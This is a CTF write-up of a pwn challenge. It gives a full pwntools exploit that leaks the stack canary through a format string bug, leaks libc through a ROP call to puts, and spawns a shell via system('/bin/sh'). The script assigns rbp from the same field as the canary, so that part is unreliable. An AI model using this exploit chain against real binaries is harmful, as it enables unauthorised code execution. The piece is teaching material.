This was a pwn challenge finally rated with 316 points at DEKRA CTF. There was no description.

They give us a zip file with the binary, libc.so.6 and the dynamic linker.

---

# First execution

When we first execute it we get:

> ❯ ./echopwn-bin
<br>echo> hello
<br>hello
<br>echo> hi

So it looks like we put some input that is written back to us and finally put something again and the program exit.

The input is reflected back to us so it looks like a **format string vulnerability**?

>❯ ./echopwn-bin
<br>echo> %x %x %x
<br>78252078 0 a24da980
<br>echo> yeah

Yes! That worked. We can't do anymore here. Let's move on to the disassembler.

# Reverse all the things

The dashboard of the binary showed us this information:

![](/./assets/imgs/echopwn-dashboard.png)

Wow, that looks pretty secure. Canary, NX bit, PIC...

If we want to make a **buffer overflow** we are going to need that **canary**. Luckly for us we know there is a **format string vulnerability** which will provides the solution for that problem! (At least we hope so)

Let's move to the main function

![](/./assets/imgs/echopwn-main.png)

Nothing interesting really. Let's check what that **doRead** does.

![](/./assets/imgs/echopwn-doread.png)

Well, we can see a **printf**, then a **gets**, another **printf** and finally a **gets** again. That matches what we saw when we first run the binary. 

Before leaving, it checks the canary so... yeah. Obviously we are dumping that canary.

# Brainstorming

So the question is, now what? Well, there is no hidden function which contains the flag, no file loaded, no nothing. So we have to pop a shell.

The easiest way is to use **libc** to call **execve** or **system** with **/bin/sh**. To do that, we need to know where libc is loaded that particular execution (remember PIC?). We can leak that address because we know we can overflow with that final gets (as well as the first one, but that's for other purposes)

But remember, there is **canary** so first we have to dump the canary (with the first gets) so the program doesn't break.

![](/./assets/imgs/echopwn-canary.jpg)


# Let's build the exploit

## Canary

First things first: the canary. We have to dump it to put it back when we overflow. We are using the format string to dump it. Let's fire up **gdb** to find the exact spot.

> I'm also using [GEF](https://github.com/hugsy/gef) which helps me with the debugging

Let's run it with:

`gdb echopwn`

Then:

`disass doRead`

Let's put a break at the end:

`b *doRead + 0x153`

And run it with `r`

Let's put a bunch of %lx (so we don't write over the canary):

![](/./assets/imgs/echopwn-format1.png)

And when we hit the breakpoint, check for $rbp - 0x8

![](/./assets/imgs/echopwn-format2.png)

Well, that doesn't match any of the ones dumped. Let's move to the next group. To access a specific item on the stack you can use: **%n$lx**, being **n** the number of the **nth item** on the stack so now we are sending: %5$lx %6$lx ...

On that iteration we don't get anything either. But finally:

```
echo> %10$lx %11$lx %12$lx %13$lx              
33312520786c2432 555500786c24 55554040 afbf17a0d8f2bb00

Breakpoint 1, 0x00005555555548c9 in doRead ()
gef➤  x/2x $rbp-0x8
0x7fffffffdbc8:	0xd8f2bb00	0xafbf17a0
```

So the canary is on the 13th position!

## Dump libc address

To dump the libc address we are going to print back to us the address of a function from libc. Then, because we have the binary file (libc.so.6), we can substract the base address of that function and get the offset.

We have `gets` there so let's use that function.

Remember! We have to redirect the execution back so the program doesn't exit!

## Pop that shell

To pop the shell, we are going to put the string '/bin/sh' into the RDI register and then call the `system` function from libc.

# Time to build the script

You know, pwntools.

```python
from pwn import *

p = process('./echopwn')
#p = remote('__________', _____)
elf = ELF('./echopwn')
libc = ELF('./.glibc/libc.so.6')
```

Get the canary and the address of the main function:

> I'm also getting the rbp adddress so the stack doesn't move to some weird address

```python
p.clean()
p.sendline('AAA.%13$lx.%14$lx.%15$lx')
data = p.recvuntil("\n")
canary = data.split(b'.')[1]
rbp = data.split(b'.')[1]
main = data.split(b'.')[3]
print('Canary is 0x' + canary.decode())
print('Main + 21 (0x0000000000000908) is 0x' + main.decode())
canary = int(canary, base=16)
main = int(main, base=16)
rbp = int(rbp, base=16)
```

Now, let's get the libc base address. First, we need to find a ROP gadget to put the address of `gets` into the RDI register:

> I used [ROPGadget](https://github.com/JonathanSalwan/ROPgadget) to do this

```bash
$ ROPGadget --binary echopwn
...
0x0000000000000973 : pop rdi ; ret
0x000000000000068e : ret
...
```

We have the address, let's send it:

```python
binary_offset = main - 0x908
pop_rdi = p64(0x973 + binary_offset)

p.clean()
p.sendline(b'A' * 52 + p64(canary) + p64(rbp) + pop_rdi + p64(binary_offset + elf.got["gets"]) + p64(binary_offset + elf.symbols["puts"]) + p64(binary_offset +elf.symbols["main"]))
```

Now, the final part. Receive the address:

```python
glibc_dumped = p.recvuntil('\n')[:-1]

def pad_null_bytes(value):
    return value + b'\x00' * (8-len(value))

glibc_base_address = u64(pad_null_bytes(glibc_dumped)) - libc.symbols["gets"]
print('Libc is at: ', hex(glibc_base_address))
```

And send the final exploit to pop the shell:

```python
p.clean()
p.sendline('AAA.%13$lx.%14$lx.%15$lx')
data = p.recvuntil("\n")
canary = data.split(b'.')[1]
rbp = data.split(b'.')[1]
print('Canary is 0x' + canary.decode())
canary = int(canary, base=16)
rbp = int(rbp, base=16)
p.clean()
p.sendline(b'A' * 52 + p64(canary) + p64(rbp) + pop_rdi + p64(glibc_base_address + next(libc.search(b'/bin/sh'))) + p64(glibc_base_address + libc.symbols["system"]))
p.interactive()
```

Sweet!
